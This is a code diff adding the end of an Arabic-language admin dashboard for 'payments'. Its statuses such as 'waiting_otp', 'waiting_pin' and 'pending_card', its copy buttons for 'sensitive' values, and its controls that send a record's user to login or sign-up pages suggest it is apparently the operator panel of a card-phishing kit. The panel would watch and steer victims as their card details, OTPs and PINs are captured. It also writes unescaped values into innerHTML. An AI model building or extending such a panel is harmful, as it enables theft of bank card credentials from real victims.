+    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>التسجيل</button>';
+    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>الدخول</button>';
+    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button>';
+    html += '</div></div>';
+    document.getElementById('modal-title').textContent = 'تفاصيل الطلب - ' + (p.refNumber || p.id.substring(0, 8));
+    document.getElementById('modal-body').innerHTML = html;
+    document.getElementById('modal-overlay').classList.add('active');
+  }
+
+  function dRow(label, val, sensitive) {
+    if (!val) return '';
+    var v = '<span class="d-val' + (sensitive ? ' sensitive' : '') + '">' + val + '<button class="copy-btn" data-action="copy" data-val="' + val.replace(/"/g, '&quot;') + '"><i class="bi bi-copy"></i></button></span>';
+    return '<div><div class="d-lbl">' + label + '</div>' + v + '</div>';
+  }
+
+  function copyVal(val) {
+    try { navigator.clipboard.writeText(val); } catch(e) {}
+  }
+
+  function closeModal() {
+    document.getElementById('modal-overlay').classList.remove('active');
+    currentModalId = null;
+  }
+
+  function updateStats() {
+    document.getElementById('stat-total').textContent = allPayments.length;
+    document.getElementById('stat-pending').textContent = allPayments.filter(function(p) {
+      return ['PENDING','OTP_REQUEST','pending_card','waiting_otp','pending_otp','waiting_pin','pending_pin'].includes(p.status);
+    }).length;
+    document.getElementById('stat-approved').textContent = allPayments.filter(function(p) {
+      return ['SUCCESS','APPROVED','completed'].includes(p.status);
+    }).length;
+    document.getElementById('stat-rejected').textContent = allPayments.filter(function(p) {
+      return ['REJECTED','OTP_FAILED','rejected'].includes(p.status);
+    }).length;
+  }
+
+  function showNotification(title, sub, data, type) {
+    var el = document.getElementById('notification');
+    document.getElementById('notif-title').textContent = title;
+    document.getElementById('notif-sub').textContent = sub || '';
+    document.getElementById('notif-data').textContent = data || '';
+    el.className = 'notification show ' + (type || '');
+    if (notifTimeout) clearTimeout(notifTimeout);
+    notifTimeout = setTimeout(function() { el.classList.remove('show'); }, 5000);
+  }
+
+  function bumpNotif() {
+    notifCount++;
+    var badge = document.getElementById('notif-badge');
+    badge.textContent = notifCount;
+    badge.style.display = 'flex';
+  }
+
+  function playSound() {
+    try {
+      var ctx = new (window.AudioContext || window.webkitAudioContext)();
+      var osc = ctx.createOscillator();
+      var gain = ctx.createGain();
+      osc.connect(gain); gain.connect(ctx.destination);
+      osc.frequency.value = 880;
+      gain.gain.setValueAtTime(0.3, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
+      osc.start(ctx.currentTime);
+      osc.stop(ctx.currentTime + 0.5);
+    } catch(e) {}
+  }
+
+  setInterval(function() { if (adminToken) loadPayments(); }, 15000);
+})();
 <\/script>
 </body>
 </html>`;
+  return html;
 }
 
 const PORT = process.env.PORT || 8080;
